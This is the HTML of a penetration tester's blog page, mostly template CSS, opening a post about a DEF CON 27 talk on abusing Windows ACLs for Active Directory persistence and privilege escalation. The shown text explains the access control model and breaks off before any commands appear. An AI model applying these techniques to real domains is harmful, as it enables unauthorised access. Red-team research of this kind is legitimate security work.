<!DOCTYPE html>
<html class='v2' dir='ltr' lang='en' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='https://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
<head>
<link href='https://www.blogger.com/static/v1/widgets/3566091532-css_bundle_v2.css' rel='stylesheet' type='text/css'/>
<meta content='width=1100' name='viewport'/>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<meta content='blogger' name='generator'/>
<link href='https://www.labofapenetrationtester.com/favicon.ico' rel='icon' type='image/x-icon'/>
<link href='http://www.labofapenetrationtester.com/' rel='canonical'/>
<link rel="alternate" type="application/atom+xml" title="Lab of a Penetration Tester - Atom" href="https://www.labofapenetrationtester.com/feeds/posts/default" />
<link rel="alternate" type="application/rss+xml" title="Lab of a Penetration Tester - RSS" href="https://www.labofapenetrationtester.com/feeds/posts/default?alt=rss" />
<link rel="service.post" type="application/atom+xml" title="Lab of a Penetration Tester - Atom" href="https://www.blogger.com/feeds/8135211063584500909/posts/default" />
<link rel="me" href="https://www.blogger.com/profile/02092541175521734123" />
<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
<meta content='Home of Nikhil SamratAshok Mittal. Posts about Red Teaming, Offensive PowerShell, Active Directory and Pen Testing.' name='description'/>
<meta content='http://www.labofapenetrationtester.com/' property='og:url'/>
<meta content='Lab of a Penetration Tester' property='og:title'/>
<meta content='Home of Nikhil SamratAshok Mittal. Posts about Red Teaming, Offensive PowerShell, Active Directory and Pen Testing.' property='og:description'/>
<title>Lab of a Penetration Tester</title>
<style id='page-skin-1' type='text/css'><!--
/*
-----------------------------------------------
Blogger Template Style
Name:     Awesome Inc.
Designer: Tina Chen
URL:      tinachen.org
----------------------------------------------- */
/* Content
----------------------------------------------- */
body {
font: normal normal 16px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #222222;
background: #eeeeee none repeat scroll top left;
}
html body .content-outer {
min-width: 0;
max-width: 100%;
width: 100%;
}
a:link {
text-decoration: none;
color: #3778cd;
}
a:visited {
text-decoration: none;
color: #4d469c;
}
a:hover {
text-decoration: underline;
color: #3778cd;
}
.body-fauxcolumn-outer .cap-top {
position: absolute;
z-index: 1;
height: 276px;
width: 100%;
background: transparent none repeat-x scroll top left;
_background-image: none;
}
/* Columns
----------------------------------------------- */
.content-inner {
padding: 0;
}
.header-inner .section {
margin: 0 16px;
}
.tabs-inner .section {
margin: 0 16px;
}
.main-inner {
padding-top: 30px;
}
.main-inner .column-center-inner,
.main-inner .column-left-inner,
.main-inner .column-right-inner {
padding: 0 5px;
}
*+html body .main-inner .column-center-inner {
margin-top: -30px;
}
#layout .main-inner .column-center-inner {
margin-top: 0;
}
/* Header
----------------------------------------------- */
.header-outer {
margin: 0 0 0 0;
background: transparent none repeat scroll 0 0;
}
.Header h1 {
font: normal bold 40px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #222222;
text-shadow: 0 0 -1px #000000;
}
.Header h1 a {
color: #222222;
}
.Header .description {
font: normal normal 14px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #222222;
}
.header-inner .Header .titlewrapper,
.header-inner .Header .descriptionwrapper {
padding-left: 0;
padding-right: 0;
margin-bottom: 0;
}
.header-inner .Header .titlewrapper {
padding-top: 22px;
}
/* Tabs
----------------------------------------------- */
.tabs-outer {
overflow: hidden;
position: relative;
background: #eeeeee url(//www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png) repeat scroll 0 0;
}
#layout .tabs-outer {
overflow: visible;
}
.tabs-cap-top, .tabs-cap-bottom {
position: absolute;
width: 100%;
border-top: 1px solid #999999;
}
.tabs-cap-bottom {
bottom: 0;
}
.tabs-inner .widget li a {
display: inline-block;
margin: 0;
padding: .6em 1.5em;
font: normal bold 14px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #222222;
border-top: 1px solid #999999;
border-bottom: 1px solid #999999;
border-left: 1px solid #999999;
height: 16px;
line-height: 16px;
}
.tabs-inner .widget li:last-child a {
border-right: 1px solid #999999;
}
.tabs-inner .widget li.selected a, .tabs-inner .widget li a:hover {
background: #666666 url(//www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png) repeat-x scroll 0 -100px;
color: #ffffff;
}
/* Headings
----------------------------------------------- */
h2 {
font: normal bold 14px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #222222;
}
/* Widgets
----------------------------------------------- */
.main-inner .section {
margin: 0 27px;
padding: 0;
}
.main-inner .column-left-outer,
.main-inner .column-right-outer {
margin-top: 0;
}
#layout .main-inner .column-left-outer,
#layout .main-inner .column-right-outer {
margin-top: 0;
}
.main-inner .column-left-inner,
.main-inner .column-right-inner {
background: transparent none repeat 0 0;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
#layout .main-inner .column-left-inner,
#layout .main-inner .column-right-inner {
margin-top: 0;
}
.sidebar .widget {
font: normal normal 14px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #222222;
}
.sidebar .widget a:link {
color: #3778cd;
}
.sidebar .widget a:visited {
color: #4d469c;
}
.sidebar .widget a:hover {
color: #3778cd;
}
.sidebar .widget h2 {
text-shadow: 0 0 -1px #000000;
}
.main-inner .widget {
background-color: #ffffff;
border: 1px solid #eeeeee;
padding: 0 15px 15px;
margin: 20px -16px;
-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.main-inner .widget h2 {
margin: 0 -15px;
padding: .6em 15px .5em;
border-bottom: 1px solid transparent;
}
.footer-inner .widget h2 {
padding: 0 0 .4em;
border-bottom: 1px solid transparent;
}
.main-inner .widget h2 + div, .footer-inner .widget h2 + div {
border-top: 1px solid #eeeeee;
padding-top: 8px;
}
.main-inner .widget .widget-content {
margin: 0 -15px;
padding: 7px 15px 0;
}
.main-inner .widget ul, .main-inner .widget #ArchiveList ul.flat {
margin: -8px -15px 0;
padding: 0;
list-style: none;
}
.main-inner .widget #ArchiveList {
margin: -8px 0 0;
}
.main-inner .widget ul li, .main-inner .widget #ArchiveList ul.flat li {
padding: .5em 15px;
text-indent: 0;
color: #666666;
border-top: 1px solid #eeeeee;
border-bottom: 1px solid transparent;
}
.main-inner .widget #ArchiveList ul li {
padding-top: .25em;
padding-bottom: .25em;
}
.main-inner .widget ul li:first-child, .main-inner .widget #ArchiveList ul.flat li:first-child {
border-top: none;
}
.main-inner .widget ul li:last-child, .main-inner .widget #ArchiveList ul.flat li:last-child {
border-bottom: none;
}
.post-body {
position: relative;
}
.main-inner .widget .post-body ul {
padding: 0 2.5em;
margin: .5em 0;
list-style: disc;
}
.main-inner .widget .post-body ul li {
padding: 0.25em 0;
margin-bottom: .25em;
color: #222222;
border: none;
}
.footer-inner .widget ul {
padding: 0;
list-style: none;
}
.widget .zippy {
color: #666666;
}
/* Posts
----------------------------------------------- */
body .main-inner .Blog {
padding: 0;
margin-bottom: 1em;
background-color: transparent;
border: none;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
box-shadow: 0 0 0 rgba(0, 0, 0, 0);
}
.main-inner .section:last-child .Blog:last-child {
padding: 0;
margin-bottom: 1em;
}
.main-inner .widget h2.date-header {
margin: 0 -15px 1px;
padding: 0 0 0 0;
font: normal normal 14px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #444444;
background: transparent none no-repeat scroll top left;
border-top: 0 solid #eeeeee;
border-bottom: 1px solid transparent;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius: 0;
position: static;
bottom: 100%;
right: 15px;
text-shadow: 0 0 -1px #000000;
}
.main-inner .widget h2.date-header span {
font: normal normal 14px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
display: block;
padding: .5em 15px;
border-left: 0 solid #eeeeee;
border-right: 0 solid #eeeeee;
}
.date-outer {
position: relative;
margin: 30px 0 20px;
padding: 0 15px;
background-color: #ffffff;
border: 1px solid #eeeeee;
-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.date-outer:first-child {
margin-top: 0;
}
.date-outer:last-child {
margin-bottom: 20px;
-moz-border-radius-bottomleft: 0;
-moz-border-radius-bottomright: 0;
-webkit-border-bottom-left-radius: 0;
-webkit-border-bottom-right-radius: 0;
-goog-ms-border-bottom-left-radius: 0;
-goog-ms-border-bottom-right-radius: 0;
border-bottom-left-radius: 0;
border-bottom-right-radius: 0;
}
.date-posts {
margin: 0 -15px;
padding: 0 15px;
clear: both;
}
.post-outer, .inline-ad {
border-top: 1px solid #eeeeee;
margin: 0 -15px;
padding: 15px 15px;
}
.post-outer {
padding-bottom: 10px;
}
.post-outer:first-child {
padding-top: 0;
border-top: none;
}
.post-outer:last-child, .inline-ad:last-child {
border-bottom: none;
}
.post-body {
position: relative;
}
.post-body img {
padding: 8px;
background: transparent;
border: 1px solid transparent;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
border-radius: 0;
}
h3.post-title, h4 {
font: normal bold 22px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #222222;
}
h3.post-title a {
font: normal bold 22px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #222222;
}
h3.post-title a:hover {
color: #3778cd;
text-decoration: underline;
}
.post-header {
margin: 0 0 1em;
}
.post-body {
line-height: 1.4;
}
.post-outer h2 {
color: #222222;
}
.post-footer {
margin: 1.5em 0 0;
}
#blog-pager {
padding: 15px;
font-size: 120%;
background-color: #ffffff;
border: 1px solid #eeeeee;
-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-top-left-radius: 0;
-goog-ms-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius-topright: 0;
margin-top: 1em;
}
.blog-feeds, .post-feeds {
margin: 1em 0;
text-align: center;
color: #222222;
}
.blog-feeds a, .post-feeds a {
color: #3778cd;
}
.blog-feeds a:visited, .post-feeds a:visited {
color: #4d469c;
}
.blog-feeds a:hover, .post-feeds a:hover {
color: #3778cd;
}
.post-outer .comments {
margin-top: 2em;
}
/* Comments
----------------------------------------------- */
.comments .comments-content .icon.blog-author {
background-repeat: no-repeat;
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
}
.comments .comments-content .loadmore a {
border-top: 1px solid #999999;
border-bottom: 1px solid #999999;
}
.comments .continue {
border-top: 2px solid #999999;
}
/* Footer
----------------------------------------------- */
.footer-outer {
margin: -20px 0 -1px;
padding: 20px 0 0;
color: #222222;
overflow: hidden;
}
.footer-fauxborder-left {
border-top: 1px solid #eeeeee;
background: #ffffff none repeat scroll 0 0;
-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
box-shadow: 0 0 20px rgba(0, 0, 0, .2);
margin: 0 -20px;
}
/* Mobile
----------------------------------------------- */
body.mobile {
background-size: auto;
}
.mobile .body-fauxcolumn-outer {
background: transparent none repeat scroll top left;
}
*+html body.mobile .main-inner .column-center-inner {
margin-top: 0;
}
.mobile .main-inner .widget {
padding: 0 0 15px;
}
.mobile .main-inner .widget h2 + div,
.mobile .footer-inner .widget h2 + div {
border-top: none;
padding-top: 0;
}
.mobile .footer-inner .widget h2 {
padding: 0.5em 0;
border-bottom: none;
}
.mobile .main-inner .widget .widget-content {
margin: 0;
padding: 7px 0 0;
}
.mobile .main-inner .widget ul,
.mobile .main-inner .widget #ArchiveList ul.flat {
margin: 0 -15px 0;
}
.mobile .main-inner .widget h2.date-header {
right: 0;
}
.mobile .date-header span {
padding: 0.4em 0;
}
.mobile .date-outer:first-child {
margin-bottom: 0;
border: 1px solid #eeeeee;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-top-left-radius: 0;
-goog-ms-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius: 0;
}
.mobile .date-outer {
border-color: #eeeeee;
border-width: 0 1px 1px;
}
.mobile .date-outer:last-child {
margin-bottom: 0;
}
.mobile .main-inner {
padding: 0;
}
.mobile .header-inner .section {
margin: 0;
}
.mobile .post-outer, .mobile .inline-ad {
padding: 5px 0;
}
.mobile .tabs-inner .section {
margin: 0 10px;
}
.mobile .main-inner .widget h2 {
margin: 0;
padding: 0;
}
.mobile .main-inner .widget h2.date-header span {
padding: 0;
}
.mobile .main-inner .widget .widget-content {
margin: 0;
padding: 7px 0 0;
}
.mobile #blog-pager {
border: 1px solid transparent;
background: #ffffff none repeat scroll 0 0;
}
.mobile .main-inner .column-left-inner,
.mobile .main-inner .column-right-inner {
background: transparent none repeat 0 0;
-moz-box-shadow: none;
-webkit-box-shadow: none;
-goog-ms-box-shadow: none;
box-shadow: none;
}
.mobile .date-posts {
margin: 0;
padding: 0;
}
.mobile .footer-fauxborder-left {
margin: 0;
border-top: inherit;
}
.mobile .main-inner .section:last-child .Blog:last-child {
margin-bottom: 0;
}
.mobile-index-contents {
color: #222222;
}
.mobile .mobile-link-button {
background: #3778cd url(//www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png) repeat scroll 0 0;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
.mobile .tabs-inner .PageList .widget-content {
background: transparent;
border-top: 1px solid;
border-color: #999999;
color: #222222;
}
.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
border-left: 1px solid #999999;
}

--></style>
<style id='template-skin-1' type='text/css'><!--
body {
min-width: 960px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 960px;
max-width: 960px;
_width: 960px;
}
.main-inner .columns {
padding-left: 0;
padding-right: 310px;
}
.main-inner .fauxcolumn-center-outer {
left: 0;
right: 310px;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0") -
parseInt("310px") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0;
}
.main-inner .fauxcolumn-right-outer {
width: 310px;
}
.main-inner .column-left-outer {
width: 0;
right: 100%;
margin-left: -0;
}
.main-inner .column-right-outer {
width: 310px;
margin-right: -310px;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
body#layout div.add_widget {
padding: 8px;
}
body#layout div.add_widget a {
margin-left: 32px;
}
--></style>
<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=8135211063584500909&amp;zx=31f35419-f735-4ac1-a852-1e46bddcd7ca' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=8135211063584500909&amp;zx=31f35419-f735-4ac1-a852-1e46bddcd7ca' rel='stylesheet'/></noscript>
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>

</head>
<body class='loading variant-light'>
<div class='navbar section' id='navbar' name='Navbar'><div class='widget Navbar' data-version='1' id='Navbar1'><script type="text/javascript">
    function setAttributeOnload(object, attribute, val) {
      if(window.addEventListener) {
        window.addEventListener('load',
          function(){ object[attribute] = val; }, false);
      } else {
        window.attachEvent('onload', function(){ object[attribute] = val; });
      }
    }
  </script>
<div id="navbar-iframe-container"></div>
<script type="text/javascript" src="https://apis.google.com/js/platform.js"></script>
<script type="text/javascript">
      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
        if (gapi.iframes && gapi.iframes.getContext) {
          gapi.iframes.getContext().openChild({
              url: 'https://www.blogger.com/navbar/8135211063584500909?origin\x3dhttps://www.labofapenetrationtester.com',
              where: document.getElementById("navbar-iframe-container"),
              id: "navbar-iframe"
          });
        }
      });
    </script><script type="text/javascript">
(function() {
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
var head = document.getElementsByTagName('head')[0];
if (head) {
head.appendChild(script);
}})();
</script>
</div></div>
<div itemscope='itemscope' itemtype='http://schema.org/Blog' style='display: none;'>
<meta content='Lab of a Penetration Tester' itemprop='name'/>
<meta content='Home of Nikhil SamratAshok Mittal. Posts about Red Teaming, Offensive PowerShell, Active Directory and Pen Testing.' itemprop='description'/>
</div>
<div class='body-fauxcolumns'>
<div class='fauxcolumn-outer body-fauxcolumn-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<div class='content'>
<div class='content-fauxcolumns'>
<div class='fauxcolumn-outer content-fauxcolumn-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<div class='content-outer'>
<div class='content-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left content-fauxborder-left'>
<div class='fauxborder-right content-fauxborder-right'></div>
<div class='content-inner'>
<header>
<div class='header-outer'>
<div class='header-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left header-fauxborder-left'>
<div class='fauxborder-right header-fauxborder-right'></div>
<div class='region-inner header-inner'>
<div class='header section' id='header' name='Header'><div class='widget Header' data-version='1' id='Header1'>
<div id='header-inner'>
<div class='titlewrapper'>
<h1 class='title'>
Lab of a Penetration Tester
</h1>
</div>
<div class='descriptionwrapper'>
<p class='description'><span>Home of Nikhil "SamratAshok" Mittal</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class='header-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</header>
<div class='tabs-outer'>
<div class='tabs-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left tabs-fauxborder-left'>
<div class='fauxborder-right tabs-fauxborder-right'></div>
<div class='region-inner tabs-inner'>
<div class='tabs section' id='crosscol' name='Cross-Column'><div class='widget PageList' data-version='1' id='PageList1'>
<h2>Pages</h2>
<div class='widget-content'>
<ul>
<li class='selected'>
<a href='https://www.labofapenetrationtester.com/'>Home</a>
</li>
<li>
<a href='https://www.labofapenetrationtester.com/p/about-me.html'>About Me</a>
</li>
<li>
<a href='https://www.labofapenetrationtester.com/p/blog-page.html'>Presentations</a>
</li>
<li>
<a href='https://www.labofapenetrationtester.com/p/trainings.html'>Trainings</a>
</li>
</ul>
<div class='clear'></div>
</div>
</div></div>
<div class='tabs no-items section' id='crosscol-overflow' name='Cross-Column 2'></div>
</div>
</div>
<div class='tabs-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='main-outer'>
<div class='main-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left main-fauxborder-left'>
<div class='fauxborder-right main-fauxborder-right'></div>
<div class='region-inner main-inner'>
<div class='columns fauxcolumns'>
<div class='fauxcolumn-outer fauxcolumn-center-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='fauxcolumn-outer fauxcolumn-left-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='fauxcolumn-outer fauxcolumn-right-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<!-- corrects IE6 width calculation -->
<div class='columns-inner'>
<div class='column-center-outer'>
<div class='column-center-inner'>
<div class='main section' id='main' name='Main'><div class='widget Blog' data-version='1' id='Blog1'>
<div class='blog-posts hfeed'>

          <div class="date-outer">
        
<h2 class='date-header'><span>Friday, August 23, 2019</span></h2>

          <div class="date-posts">
        
<div class='post-outer'>
<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrrDoskf8tosvfMtnLIHPN0V1fLqKVa5-Kedk_ZCOQxU_yi_e_EbV5_iXLgskKYY3pGPYQW9tDsFyN0KRMNHknw08D7TnfszErW8W_JsD97C5o6-Cl6r5TqBjuU0DYLHvnFnnj7lsju1I/s400/PSRemoting_DACL.png' itemprop='image_url'/>
<meta content='8135211063584500909' itemprop='blogId'/>
<meta content='1231579039314607678' itemprop='postId'/>
<a name='1231579039314607678'></a>
<h3 class='post-title entry-title' itemprop='name'>
<a href='https://www.labofapenetrationtester.com/2019/08/race.html'>RACE - Minimal Rights and ACE for Active Directory Dominance</a>
</h3>
<div class='post-header'>
<div class='post-header-line-1'></div>
</div>
<div class='post-body entry-content' id='post-body-1231579039314607678' itemprop='articleBody'>
<div dir="ltr" style="text-align: left;" trbidi="on">
<div dir="ltr" style="text-align: left;" trbidi="on">
<div dir="ltr" style="text-align: left;" trbidi="on">
<div dir="ltr" style="text-align: left;" trbidi="on">
<div dir="ltr" style="text-align: left;" trbidi="on">
<div style="text-align: justify;">
I recently spoke at DEF CON 27 on abusing Security Descriptors and ACLs i.e. permissions on Windows machines.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
You can find the slides <a href="https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Nikhil-Mittal-RACE-Minimal-Rights-and-ACE-for-Active-Directory-Dominance.pdf">here</a> (also at the end of the post with minor updates). The demo videos which I used for my talk can be found <a href="https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Nikhil-Mittal-RACE-Minimal-Rights-and-ACE-for-Active-Directory-Dominance-Demo-Video/">here</a> on and are also used below.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
The RACE toolkit is available on my GitHub repository.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
This blog post covers whatever I could not do in my talk. There is only so much you can cover in 45 minutes. On top of that, there was some confusion and my talk was cut short by 10 minutes -.-</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
tldr; It is possible to execute interesting persistence and on-demand privilege escalation attacks against Windows machines by only modifying ACLs of various objects. We will need administrator privileges initially. <br />
<br />
So, let's begin.<br />
<br />
We are going to use 'labuser' as the attacker controlled user and 'ops' is the target domain.</div>
<div style="text-align: justify;">
<br /></div>
<h4 style="text-align: justify;">
About Windows Access Control Model:</h4>
<div style="text-align: justify;">
Microsoft's <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-components">documentation on Access Control Model</a> explains it really well. But below is a quick summary:</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Every authenticated user gets an access token. Each process or thread created by that user has a copy of that access token. The token contains identity (SIDs) and privileges of the user.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Now, when a process tries to access a <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/securable-objects">securable object</a> (Files, Registry Keys, Services, Domain Objects etc.) it uses the access token. A securable object, by definition, has a security descriptor. A security descriptor can contain <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">Access Control List (ACL)</a> which is a list of <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings">Access Control Entries (ACE)</a>. There are two types of ACLs&nbsp; Discretionary Access Control List (DACL) and SACL (System Access Control List).&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
DACL controls access to an object and SACL controls logging of access attempts.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
So, when a process or thread tries to access a securable object, the system checks the permissions for the access token (and therefore the user) against each ACE in DACL. The process gets access in case of an explicit allow or if there is no DACL. All other cases result in an access denied.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
An ACE contains access control information. The relevant information to this discussion is access mask. <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks">The access mask in an ACE contains access rights</a>. This governs what a user can do on an object. For example, a user may have permissions to stop a process whereas another may have the access rights to configure a process. This is what defines access in Windows.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
</div>
<h4 style="text-align: justify;">
Minimal Permissions</h4>
<div style="text-align: justify;">
Once we have understood the concept, let's think what makes a Domain Admin so powerful?&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
A Domain Admin is so powerful because it has permissions to modify almost all objects on machines in a domain. </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Do we need Domain Admin privileges for all the interesting things? Not really! We can use just enough rights to perform a particular task. That is, in place of having FullControl or GenericAll over an object we can use Minimal Permissions required to perform a task.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
For example, what allows a user to connect to a remote machine using PowreShell Remoting? By default, administrator rights are required. If we have a look at the ACL of the PowerShell Remoting Endpoint we understand that the Administrators group has FullControl over it:</div>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrrDoskf8tosvfMtnLIHPN0V1fLqKVa5-Kedk_ZCOQxU_yi_e_EbV5_iXLgskKYY3pGPYQW9tDsFyN0KRMNHknw08D7TnfszErW8W_JsD97C5o6-Cl6r5TqBjuU0DYLHvnFnnj7lsju1I/s1600/PSRemoting_DACL.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="562" data-original-width="453" height="400" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrrDoskf8tosvfMtnLIHPN0V1fLqKVa5-Kedk_ZCOQxU_yi_e_EbV5_iXLgskKYY3pGPYQW9tDsFyN0KRMNHknw08D7TnfszErW8W_JsD97C5o6-Cl6r5TqBjuU0DYLHvnFnnj7lsju1I/s400/PSRemoting_DACL.png" width="321" /></a></div>
